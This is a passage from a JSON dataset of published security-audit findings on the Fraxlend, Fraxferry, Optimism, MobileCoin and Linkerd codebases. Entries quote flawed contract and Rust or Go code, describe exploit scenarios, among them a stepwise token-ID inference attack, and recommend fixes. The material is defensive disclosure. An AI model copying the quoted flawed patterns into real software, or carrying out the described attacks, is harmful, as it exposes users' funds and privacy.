        "body": "A Fraxlend custom pair can include a list of approved lenders; these are the only lenders who can deposit the underlying asset into the given pair and receive the corresponding fTokens. However, the system does not perform checks when users transfer fTokens; as a result, approved lenders could send fTokens to unapproved addresses. Although unapproved addresses can only redeem fTokens sent to themmeaning this issue is not security-criticalthe ability for approved lenders to send fTokens to unapproved addresses conicts with the currently documented behavior. function deposit ( uint256 _amount , address _receiver ) external nonReentrant isNotPastMaturity whenNotPaused approvedLender(_receiver) returns ( uint256 _sharesReceived ) {...} Figure 6.1: The deposit function in FraxlendPairCore.sol#L587-L594 Exploit Scenario Bob, an approved lender, deposits 100 asset tokens and receives 90 fTokens. He then sends the fTokens to an unapproved address, causing other users to worry about the state of the protocol. Recommendations Short term, override the _beforeTokenTransfer function by applying the approvedLender modier to it. Alternatively, document the ability for approved lenders to send fTokens to unapproved addresses. Long term, when applying access controls to token owners, make sure to evaluate all the possible ways in which a token can be transferred and document the expected behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. FraxlendPairDeployer cannot deploy contracts of fewer than 13,000 bytes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "The FraxlendPairDeployer contract, which is used to deploy new pairs, does not allow contracts that contain less than 13,000 bytes of code to be deployed. To deploy new pairs, users call the deploy or deployCustom function, which then internally calls _deployFirst . This function uses the create2 opcode to create a contract for the pair by concatenating the bytecode stored in contractAddress1 and contractAddress2 . The setCreationCode function, which uses solmates SSTORE2 library to store the bytecode for use by create2 , splits the bytecode into two separate contracts ( contractAddress1 and contractAddress2 ) if the _creationCode size is greater than 13,000. function setCreationCode ( bytes calldata _creationCode) external onlyOwner { bytes memory _firstHalf = BytesLib.slice(_creationCode, 0 , 13000 ); contractAddress1 = SSTORE2.write(_firstHalf); if (_creationCode.length > 13000 ) { bytes memory _secondHalf = BytesLib.slice(_creationCode, 13000 , _creationCode.length - 13000 ); contractAddress2 = SSTORE2.write(_secondHalf); } } Figure 7.1: The setCreationCode function in FraxlendPairDeployer.sol#L173-L180 The rst problem is that if the _creationCode size is less than 13,000, BytesLib.slice will revert with the slice_outOfBounds error, as shown in gure 7.2. function slice ( bytes memory _bytes, uint256 _start , uint256 _length ) internal pure returns ( bytes memory ) { require (_length + 31 >= _length, \"slice_overflow\" ); require (_bytes.length >= _start + _length, \"slice_outOfBounds\" ); Figure 7.2: The BytesLib.slice function from the solidity-bytes-utils library Assuming that the rst problem does not exist, another problem arises from the use of SSTORE2.read in the _deployFirst function (gure 7.3). If the creation code was less than 13,000 bytes, contractAddress2 would be set to address(0) . This would cause the SSTORE2.read functions pointer.code.length - DATA_OFFSET computation, shown in gure 7.4, to underow, causing the SSTORE2.read operation to panic. function _deployFirst ( // [...] ) private returns ( address _pairAddress ) { { // [...] bytes memory _creationCode = BytesLib.concat( SSTORE2.read(contractAddress1), SSTORE2.read(contractAddress2) ); Figure 7.3: The _deployFirst function in FraxlendPairDeployer.sol#L212-L231 uint256 internal constant DATA_OFFSET = 1 ; function read ( address pointer ) internal view returns ( bytes memory ) { return readBytecode(pointer, DATA_OFFSET, pointer.code.length - DATA_OFFSET ); } Figure 7.4: The SSTORE2.read function from the solmate library Exploit Scenario Bob, the FraxlendPairDeployer contracts owner, wants to set the creation code to be a contract with fewer than 13,000 bytes. When he calls setCreationCode , it reverts. Recommendations Short term, make the following changes:   In setCreationCode , in the line that sets the _firstHalf variable, replace 13000 in the third argument of BytesLib.slice with min(13000, _creationCode.length) . In _deployFirst , add a check to ensure that the SSTORE2.read(contractAddress2) operation executes only if contractAddress2 is not address(0) . Alternatively, document the fact that it is not possible to deploy contracts with fewer than 13,000 bytes. Long term, improve the projects unit tests and fuzz tests to check that the functions behave as expected and cannot unexpectedly revert.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. setCreationCode fails to overwrite _secondHalf slice if updated code size is less than 13,000 bytes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "The setCreationCode function permits the owner of FraxlendPairDeployer to set the bytecode that will be used to create contracts for newly deployed pairs. If the _creationCode size is greater than 13,000 bytes, it will be split into two separate contracts ( contractAddress1 and contractAddress2 ). However (assuming that TOB-FXLEND-7 were xed), if a FraxlendPairDeployer owner were to change the creation code from one of greater than 13,000 bytes to one of fewer than 13,000 bytes, contractAddress2 would not be reset to address(0) ; therefore, contractAddress2 would still contain the second half of the previous creation code. function setCreationCode ( bytes calldata _creationCode) external onlyOwner { bytes memory _firstHalf = BytesLib.slice(_creationCode, 0 , 13000 ); contractAddress1 = SSTORE2.write(_firstHalf); if (_creationCode.length > 13000 ) { bytes memory _secondHalf = BytesLib.slice(_creationCode, 13000 , _creationCode.length - 13000 ); contractAddress2 = SSTORE2.write(_secondHalf); } } Figure 8.1: The setCreationCode function in FraxlendPairDeployer.sol#L173-L180 Exploit Scenario Bob, FraxlendPairDeployer s owner, changes the creation code from one of more than 13,000 bytes to one of less than 13,000 bytes. As a result, deploy and deployCustom deploy contracts with unexpected bytecode. Recommendations Short term, modify the setCreationCode function so that it sets contractAddress2 to address(0) at the beginning of the function . Long term, improve the projects unit tests and fuzz tests to check that the functions behave as expected and cannot unexpectedly revert.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "9. Missing checks in setter functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "The setFee and setMinWaitPeriods functions do not have appropriate checks. First, the setFee function does not have an upper limit, which means that the Fraxferry owner can set enormous fees. Second, the setMinWaitPeriods function does not require the new value to be at least one hour. A minimum waiting time of less than one hour would invalidate important safety assumptions. For example, in the event of a reorganization on the source chain, the minimum one-hour waiting time ensures that only transactions after the reorganization are ferried (as described in the code comment in gure 9.1). ** - Reorgs on the source chain. Avoided, by only returning the transactions on the source chain that are at least one hour old. ** - Rollbacks of optimistic rollups. Avoided by running a node. ** - Operators do not have enough time to pause the chain after a fake proposal. Avoided by requiring a minimal amount of time between sending the proposal and executing it. // [...] function setFee ( uint _FEE ) external isOwner { FEE=_FEE; emit SetFee(_FEE); } function setMinWaitPeriods ( uint _MIN_WAIT_PERIOD_ADD , uint _MIN_WAIT_PERIOD_EXECUTE ) external isOwner { MIN_WAIT_PERIOD_ADD=_MIN_WAIT_PERIOD_ADD; MIN_WAIT_PERIOD_EXECUTE=_MIN_WAIT_PERIOD_EXECUTE; emit SetMinWaitPeriods(_MIN_WAIT_PERIOD_ADD, _MIN_WAIT_PERIOD_EXECUTE); } Figure 9.1: The setFee and setMinWaitPeriods functions in Fraxferry.sol#L226-L235 Exploit Scenario Bob, Fraxferry s owner, calls setMinWaitPeriods with a _MIN_WAIT_PERIOD_ADD value lower than 3,600 (one hour) , invalidating the waiting periods protection regarding chain reorganizations. Recommendations Short term, add an upper limit check to the setFee function; add a check to the setMinWaitPeriods function to ensure that _MIN_WAIT_PERIOD_ADD and _MIN_WAIT_PERIOD_EXECUTE are at least 3,600 (one hour). Long term, make sure that conguration variables can be set only to valid values.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Risk of invalid batches due to unsafe cast in depart function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "The depart function performs an unsafe cast operation that could result in an invalid batch. Users who want to send tokens to a certain chain use the various embark* functions. These functions eventually call embarkWithRecipient , which adds the relevant transactions to the transactions array. function embarkWithRecipient ( uint amount , address recipient ) public notPaused { // [...] transactions.push(Transaction(recipient,amountAfterFee, uint32 ( block.timestamp ))); } Figure 10.1: The embarkWithRecipient function in Fraxferry.sol#L127-L135 At a certain point, the captain role calls depart with the start and end indices within transactions to specify the transactions inside of a batch. However, the depart function performs an unsafe cast operation when creating the new batch; because of this unsafe cast operation, an end value greater than 2 ** 64 would be cast to a value lower than the start value, breaking the invariant that end is greater than or equal to start . function depart ( uint start , uint end , bytes32 hash ) external notPaused isCaptain { require ((batches.length== 0 && start== 0 ) || (batches.length> 0 && start==batches[batches.length- 1 ].end+ 1 ), \"Wrong start\" ); require (end>=start, \"Wrong end\" ); batches.push(Batch( uint64 (start), uint64 (end), uint64 ( block.timestamp ), 0 , hash )); emit Depart(batches.length- 1 ,start,end, hash ); } Figure 10.2: The depart function in Fraxferry.sol#L155-L160 If the resulting incorrect batch is not disputed by the crew member roles, which would cause the system to enter a paused state, the rst ocer role will call disembark to actually execute the transactions on the target chain. However, the disembark functions third check, highlighted in gure 10.3, on the invalid transaction will fail, causing the transaction to revert and the system to stop working until the incorrect batch is removed with a call to removeBatches . function disembark (BatchData calldata batchData) external notPaused isFirstOfficer { Batch memory batch = batches[executeIndex++]; require (batch.status== 0 , \"Batch disputed\" ); require (batch.start==batchData.startTransactionNo, \"Wrong start\" ); require (batch.start+batchData.transactions.length- 1 ==batch.end, \"Wrong size\" ); require ( block.timestamp -batch.departureTime>=MIN_WAIT_PERIOD_EXECUTE, \"Too soon\" ); // [...] } Figure 10.3: The disembark function in Fraxferry.sol#L162-L178 Exploit Scenario Bob, Fraxferry s captain, calls depart with an end value greater than 2 ** 64 , which is cast to a value less than start . As a consequence, the system becomes unavailable either because the crew members called disputeBatch or because the disembark function reverts. Recommendations Short term, replace the unsafe cast operation in the depart function with a safe cast operation to ensure that the end >= start invariant holds. Long term, implement robust unit tests and fuzz tests to check that important invariants hold.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Transactions that were already executed can be canceled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "The Fraxferry contracts owner can call the jettison or jettisonGroup functions to cancel a transaction or a series of transactions, respectively. However, these functions incorrectly use the executeIndex variable to determine whether the given transaction has already been executed. As a result, it is possible to cancel an already executed transaction. The problem is that executeIndex tracks executed batches, not executed transactions. Because a batch can contain more than one transaction, the check in the _jettison function (gure 11.1) does not work correctly. function _jettison ( uint index , bool cancel ) internal { require (index>=executeIndex, \"Transaction already executed\" ); cancelled[index]=cancel; emit Cancelled(index,cancel); } function jettison ( uint index , bool cancel ) external isOwner { _jettison(index,cancel); } function jettisonGroup ( uint [] calldata indexes, bool cancel ) external isOwner { for ( uint i = 0 ;i<indexes.length;++i) { _jettison(indexes[i],cancel); } } Figure 11.1: The _jettison , jettison , and jettisonGroup functions in Fraxferry.sol#L208-L222 Note that canceling a transaction that has already been executed does not cancel its eects (i.e., the tokens were already sent to the receiver). Exploit Scenario Two batches of 10 transactions are executed; executeIndex is now 2 . Bob, Fraxferry s owner, calls jettison with an index value of 13 to cancel one of these transactions. The call to jettison should revert, but it is executed correctly. The emitted Cancelled event shows that a transaction that had already been executed was canceled, confusing the o-chain monitoring system. Recommendations Short term, use a dierent index in the jettison and jettisonGroup functions to track executed transactions. Long term, implement robust unit tests and fuzz tests to check that important invariants hold.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Lack of contract existence check on low-level call ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "The execute function includes a low-level call operation without a contract existence check; call operations return true even if the _to address is not a contract, so it is important to include contract existence checks alongside such operations. // Generic proxy function execute ( address _to , uint256 _value , bytes calldata _data) external isOwner returns ( bool , bytes memory ) { ( bool success , bytes memory result) = _to.call{value:_value}(_data); return (success, result); } Figure 12.1: The execute function in Fraxferry.sol#L274-L278 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 12.2: A snippet of the Solidity documentation detailing unexpected behavior related to call Exploit Scenario Bob, Fraxferry s owner, calls execute with _to set to an address that should be a contract; however, the contract was self-destructed. Even though the contract at this address no longer exists, the operation still succeeds. Recommendations Short term, implement a contract existence check before the call operation in the execute function. If the call operation is expected to send ETH to an externally owned address, ensure that the check is performed only if the _data.length is not zero. Long term, carefully review the Solidity documentation , especially the Warnings section.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Events could be improved ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-10-fraxfinance-fraxlend-fraxferry-securityreview.pdf",
        "body": "The events declared in the Fraxferry contract could be improved to be more useful to users and monitoring systems. Certain events could be more useful if they used the indexed keyword. For example, in the Embark event, the indexed keyword could be applied to the sender parameter. Additionally, SetCaptain , SetFirstOfficier , SetFee , and SetMinWaitPeriods could be more useful if they emitted the previous value in addition to the newly set one. event Embark ( address sender , uint index , uint amount , uint amountAfterFee , uint timestamp ); event Disembark ( uint start , uint end , bytes32 hash ); event Depart ( uint batchNo , uint start , uint end , bytes32 hash ); event RemoveBatch ( uint batchNo ); event DisputeBatch ( uint batchNo , bytes32 hash ); event Cancelled ( uint index , bool cancel ); event Pause ( bool paused ); event OwnerNominated ( address newOwner ); event OwnerChanged ( address previousOwner , address newOwner ); event SetCaptain ( address newCaptain ); event SetFirstOfficer ( address newFirstOfficer ); event SetCrewmember ( address crewmember , bool set ); event SetFee ( uint fee ); event SetMinWaitPeriods ( uint minWaitAdd , uint minWaitExecute ); Figure 13.1: Events declared in Fraxferry.sol#L83-L96 Recommendations Short term, add the indexed keyword to any events that could benet from it; modify events that report on setter operations so that they report the previous values in addition to the newly set values.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Risk of miscongured GasPriceOracle state variables that can lock L2 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-optimism-securityreview.pdf",
        "body": "When bootstrapping the L2 network operated by op-geth , the GasPriceOracle contract is pre-deployed to L2, and its contract state variables are used to specify the L1 costs to be charged on L2. Three state variables are used to compute the costs decimals , overhead , and scalar which can be updated through transactions sent to the node. However, these state variables could be miscongured in a way that sets gas prices high enough to prevent transactions from being processed. For example, if overhead were set to the maximum value, a 256-bit unsigned integer, the subsequent transactions would not be accepted. In an end-to-end test of the above example, contract bindings used in op-e2e tests (such as the GasPriceOracle bindings used to update the state variables) were no longer able to make subsequent transactions/updates, as calls to SetOverhead or SetDecimals resulted in a deadlock. Sending a transaction directly through the RPC client did not produce a transaction receipt that could be fetched. Recommendations Short term, implement checks to ensure that GasPriceOracle parameters can be updated if fee parameters were previously miscongured. This could be achieved by adding an exception to GasPriceOracle fees when the contract owner calls methods within the contract or by setting a maximum fee cap. Long term, develop operational procedures to ensure the system is not deployed in or otherwise entered into an unexpected state as a result of operator actions. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Project contains vulnerable dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "body": "Running cargo-audit over the codebase revealed that the system under audit uses crates with Rust Security (RustSec) advisories and crates that are no longer maintained. RustSec ID",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. MobileCoin Foundation could infer token IDs in certain scenarios ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "body": "The MobileCoin Foundation is the recipient of all transaction fees and, in certain scenarios, could infer the token ID used in one of multiple transactions included in a block. MCIP-0025 introduced the concept of condential token IDs. The rationale behind the proposal is to allow the MobileCoin network to support tokens other than MOB (MobileCoins native token) in the future. Doing so requires not only that these tokens be unequivocally identiable but also that transactions involving any token, MOB or otherwise, have the same condentiality properties. Before the introduction of the condential tokens feature, all transaction fees were aggregated by the enclave, which created a single transaction fee output per block; however, the same approach applied to a system that supports transfers of tokens other than MOB could introduce information leakage risks. For example, if two users submit two transactions with the same token ID, there would be a single transaction fee output, and therefore, both users would know that they transacted with the same token. To prevent such a leak of information, MCIP-0025 proposes the following: The number of transaction fee outputs on a block should always equal the minimum value between the number of token IDs and the number of transactions in that block (e.g., num_tx_fee_out = min(num_token_ids, num_transactions)). This essentially means that a block with a single transaction will still have a single transaction fee output, but a block with multiple transactions with the same token ID will have multiple transaction fee outputs, one with the aggregated fee and the others with a zero-value fee. Finally, it is worth mentioning that transaction fees are not paid in MOB but in the token that is being transacted; this creates a better user experience, as users do not need to own MOB to send tokens to other people. While this proposal does indeed preserve the condentiality requirement, it falls short in one respect: the receiver of all transaction fees in the MobileCoin network is the MobileCoin Foundation, meaning that it will always know the token ID corresponding to a transaction fee output. Therefore, if only a single token is used in a block, the foundation will know the token ID used by all of the transactions in that block. Exploit Scenario Alice and Bob use the MobileCoin network to make payments between them. They send each other multiple payments, using the same token, and their transactions are included in a single block. Eve, who has access to the MobileCoin Foundations viewing key, is able to decrypt the transaction fee outputs corresponding to that block and, because no other token was used inside the block, is able to infer the token that Alice and Bob used to make the payments. Recommendations Short term, document the fact that transaction token IDs are visible to the MobileCoin Foundation. Transparency on this issue will help users understand the information that is visible by some parties. Additionally, consider implementing the following alternative designs:  Require that all transaction fees be paid in MOB. This solution would result in a degraded user experience compared to the current design; however, it would address the issue at hand.  Aggregate fee outputs across multiple blocks. This solution would achieve only probabilistic condentiality of information because if all those blocks transact in the same token, the foundation would still be able to infer the ID. Long term, document the trade-os between allowing users to pay fees in the tokens they transact with and restricting fee payments to only MOB, and document how these trade-os could aect the condentiality of the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Token IDs are protected only by SGX ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "body": "Token IDs are intended to be condential. However, they are operated on within an SGX enclave. This is an apparent departure from MobileCoins previous approach of using SGX as an additional security mechanism, not a primary one. Previously, most condential information in MobileCoin was protected by SGX and another security mechanism. Examples include the following:  A transactions senders, recipients, and amounts are protected by SGX and ring signatures.  The transactions a user interacts with through Fog are protected by both SGX and oblivious RAM. However, token IDs are protected by SGX alone. (An example in which a token ID is operated on within an enclave appears in gure 3.1.) Thus, the incorporation of condential tokens seems to represent a shift in MobileCoins security posture. let token_id = TokenId::from(tx.prefix.fee_token_id); let minimum_fee = ct_min_fees .get(&token_id) .ok_or(TransactionValidationError::TokenNotYetConfigured)?; Figure 3.1: consensus/enclave/impl/src/lib.rs#L239-L243 Exploit Scenario Mallory learns of a vulnerability that allows her to see inside of an SGX enclave. Mallory uses the vulnerability to observe the token IDs used in transactions in a MobileCoin enclave that she runs. Recommendations Short term, document the fact that token IDs are not oered the same level of security as other aspects of MobileCoin. This will help set users expectations regarding the condentiality of their information (i.e., whether it could be revealed to an attacker). Long term, continue to investigate solutions to the security problems surrounding the condential tokens feature. A solution that does not reveal token IDs to the enclave could exist.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Nonces are not stored per token ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "body": "Mint and mint conguration transaction nonces are not distinguished by the tokens with which they are associated. Malicious minters or governors could use this fact to conduct denial-of-service attacks against other minters and governors. The relevant code appears in gures 4.1 and 4.2. For each type of transaction, nonces are inserted into a seen_nonces set without regard to the token indicated in the transaction. let mut seen_nonces = BTreeSet::default(); let mut validated_txs = Vec::with_capacity(mint_config_txs.len()); for tx in mint_config_txs { // Ensure all nonces are unique. if !seen_nonces.insert(tx.prefix.nonce.clone()) { return Err(Error::FormBlock(format!( \"Duplicate MintConfigTx nonce: {:?}\", tx.prefix.nonce ))); } Figure 4.1: consensus/enclave/impl/src/lib.rs#L342-L352 let mut mint_txs = Vec::with_capacity(mint_txs_with_config.len()); let mut seen_nonces = BTreeSet::default(); for (mint_tx, mint_config_tx, mint_config) in mint_txs_with_config { // The nonce should be unique. if !seen_nonces.insert(mint_tx.prefix.nonce.clone()) { return Err(Error::FormBlock(format!( \"Duplicate MintTx nonce: {:?}\", mint_tx.prefix.nonce ))); } Figure 4.2: consensus/enclave/impl/src/lib.rs#L384-L393 Note that the described attack could be made worse by how nonces are intended to be used. The following passage from the white paper suggests that nonces are generated deterministically from public data. Generating nonces in this way could make them easy for an attacker to predict. When submitting a MintTx, we include a nonce to protect against replay attacks, and a tombstone block to prevent the transaction from being nominated indenitely, and these are committed to the chain. (For example, in a bridge application, this nonce may be derived from records on the source chain, to ensure that each deposit on the source chain leads to at most one mint.) Exploit Scenario Mallory (a minter) learns that Alice (another minter) intends to submit a mint transaction with a particular nonce. Mallory submits a mint transaction with that nonce rst, making Alices invalid. Recommendations Short term, store nonces per token, instead of all together. Doing so will prevent the denial-of-service attack described above. Long term, when adding new data to blocks or to the blockchain conguration, carefully consider whether it should be stored per token. Doing so could help to prevent denial-of-service attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Clients have no option for verifying blockchain conguration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "body": "Clients have no way to verify whether the MobileCoin node they connect to is using the correct blockchain conguration. This exposes users to attacks, as detailed in the white paper: Similarly to how the nodes ensure that they are similarly congured during attestation, (by mixing a hash of their conguration into the responder id used during attestation), the peer- to-node attestation channels could also do this, so that users can fail to attest immediately if malicious manipulation of conguration has occurred. The problem with this approach is that the users have no particularly good source of truth around the correct runtime conguration of the services. The problem that users have no particularly good source of truth could be solved by publishing the latest blockchain conguration via a separate channel (e.g., a publicly accessible server). Furthermore, allowing users to opt in to such additional checks would provide additional security to users who desire it. Exploit Scenario Alice falls victim to the attack described in the white paper. The attack would have been thwarted had Alice known that the node she connected to was not using the correct blockchain conguration. Recommendations Short term, make the current blockchain conguration publicly available, and allow nodes to attest to clients using their conguration. Doing so will help security-conscious users to better protect themselves. Long term, avoid withholding data from clients during attestation. Adopt a general principle that if data should be included in node-to-node attestation, then it should be included in node-to-client attestation as well. Doing so will help to ensure the security of users.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Condential tokens cannot support frequent price swings ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "body": "The method for determining tokens minimum fees has limited applicability. In particular, it cannot support tokens whose prices change frequently. In principle, a tokens minimum fee should be comparable in value to the MOB minimum fee. Thus, if a tokens price increases relative to the price of MOB, the tokens minimum fee should decrease. Similarly, if a tokens price decreases relative to the price of MOB, the tokens minimum fee should increase. However, an enclave sets its fee map from the blockchain conguration during initialization (gure 6.1) and does not change the fee map thereafter. Thus, the enclave would seem to have to be restarted if its blockchain conguration and fee map were to change. This fact implies that the current setup cannot support tokens whose prices shift frequently. fn enclave_init( &self, peer_self_id: &ResponderId, client_self_id: &ResponderId, sealed_key: &Option<SealedBlockSigningKey>, blockchain_config: BlockchainConfig, ) -> Result<(SealedBlockSigningKey, Vec<String>)> { // Check that fee map is actually well formed FeeMap::is_valid_map(blockchain_config.fee_map.as_ref()).map_err(Error::FeeMap)?; // Validate governors signature. if !blockchain_config.governors_map.is_empty() { let signature = blockchain_config .governors_signature .ok_or(Error::MissingGovernorsSignature)?; let minting_trust_root_public_key = Ed25519Public::try_from(&MINTING_TRUST_ROOT__KEY[..]) .map_err(Error::ParseMintingTrustRootPublicKey)?; minting_trust_root_public_key .verify_governors_map(&blockchain_config.governors_map, &signature) .map_err(|_| Error::InvalidGovernorsSignature)?; } self.ct_min_fee_map .set(Box::new( blockchain_config.fee_map.as_ref().iter().collect(), )) .expect(\"enclave was already initialized\"); Figure 6.1: consensus/enclave/impl/src/lib.rs#L454-L483 Exploit Scenario MobileCoin integrates token T. The value of T decreases, but the minimum fee remains the same. Users pay the minimum fee, resulting in lost income to the MobileCoin Foundation. Recommendations Short term, accept only tokens with a history of price stability. Doing so will ensure that the new features are used only with tokens that can be supported. Long term, consider including two inputs in each transaction, one for the token transferred and one to pay the fee in MOB, as suggested in TOB-MCCT-2.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Overow handling could allow recovery of transaction token ID ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-07-mobilecoin-securityreview.pdf",
        "body": "The systems fee calculation could overow a u64 value. When this occurs, the fee is divided up into multiple smaller fees, each tting into a u64 value. Under certain conditions, this behavior could be abused to reveal whether a token ID is used in a block. The relevant code appears in gure 7.1. The hypothetical attack is described in the exploit scenario below. loop { let output_fee = min(total_fee, u64::MAX as u128) as u64; outputs.push(mint_output( config.block_version, &fee_recipient, FEES_OUTPUT_PRIVATE_KEY_DOMAIN_TAG.as_bytes(), parent_block, &transactions, Amount { value: output_fee, token_id, }, outputs.len(), )); total_fee -= output_fee as u128; if total_fee == 0 { break; } } Figure 7.1: consensus/enclave/impl/src/lib.rs#L855-L873 Exploit Scenario Mallory is a (malicious) minter of token T. Suppose B is a recently minted block whose total number of fee outputs is equal to the number of tokens, which is less than the number of transactions in B. Further suppose that Mallory wishes to determine whether B contains a transaction involving T. Mallory does the following: 1. She puts her node into its state just prior to the minting of B. 2. She mints to herself a quantity of T worth u64::MAX / min_fee * min_fee. Call this quantity F. 3. She submits to her node a transaction with a fee of F. 4. She allows the block to be minted. 5. She observes the number of fee outputs in the modied block, B: a. b. If B does not contain a transaction involving T, then B contains a fee output for T equal to zero, and B contains a fee output for T equal to F. If B does contain a transaction involving T, then B contains a fee output for T equal to at least min_fee, and B contains two fee outputs for T, one of which is equal to u64::MAX. Thus, by observing the number of outputs in B, Mallory can determine whether B contains a transaction involving T. Recommendations Short term, require the total supply of all incorporated tokens not to exceed a u64 value. Doing so will eliminate the possibility of overow and prevent the attack described above. Long term, consider incorporating randomness into the number of fee outputs generated. This could provide an alternative means of preventing the attack in a way that still allows for overow. Alternatively, consider including two inputs in each transaction, one for the token transferred and one to pay the fee in MOB, as suggested in TOB-MCCT-2.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Various unhandled errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "body": "The linkerd codebase contains various methods with unhandled errors. In most cases, errors returned by functions are simply not checked; in other cases, functions that surround deferred error-returning functions do not capture the relevant errors. Using gosec and errcheck, we detected a large number of such cases, which we cannot enumerate in this report. We recommend running these tools to uncover and resolve these cases. Figures 1.1 and 1.2 provide examples of functions in the codebase with unhandled errors: func (h *handler) handleProfileDownload(w http.ResponseWriter, req *http.Request, params httprouter.Params) { [...] w.Write(profileYaml.Bytes()) } Figure 1.1: web/srv/handlers.go#L65-L91 func renderStatStats(rows []*pb.StatTable_PodGroup_Row, options *statOptions) string { [...] writeStatsToBuffer(rows, w, options) w.Flush() [...] } Figure 1.2: viz/cmd/stat.go#L295-L302 We could not determine the severity of all of the unhandled errors detected in the codebase. Exploit Scenario While an operator of the Linkerd infrastructure interacts with the system, an uncaught error occurs. Due to the lack of error reporting, the operator is unaware that the operation did not complete successfully, and he produces further undened behavior. Recommendations Short term, run gosec and errcheck across the codebase. Resolve all issues pertaining to unhandled errors by checking them explicitly. Long term, ensure that all functions that return errors have explicit checks for these errors. Consider integrating the abovementioned tooling into the CI/CD pipeline to prevent undened behavior from occurring in the aected code paths.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. The use of time.After() in select statements can lead to memory leaks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "body": "Calls to time.After in for/select statements can lead to memory leaks because the garbage collector does not clean up the underlying Timer object until the timer res. A new timer, which requires resources, is initialized at each iteration of the for loop (and, hence, the select statement). As a result, many routines originating from the time.After call could lead to overconsumption of the memory. wait: for { select { case result := <-resultChan: results = append(results, result) case <-time.After(waitingTime): break wait // timed out } if atomic.LoadInt32(&activeRoutines) == 0 { break } } Figure 2.1: cli/cmd/metrics_diagnostics_util.go#L131-L142 Recommendations Short term, consider refactoring the code that uses the time.After function in for/select loops using tickers. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, ensure that the time.After method is not used in for/select routines. Periodically use the Semgrep query to check for and detect similar patterns. References  Use with caution time.After Can cause memory leak (golang)  Golang <-time.After() is not garbage collected before expiry",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Use of string.Contains instead of string.HasPrex to check for prexes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
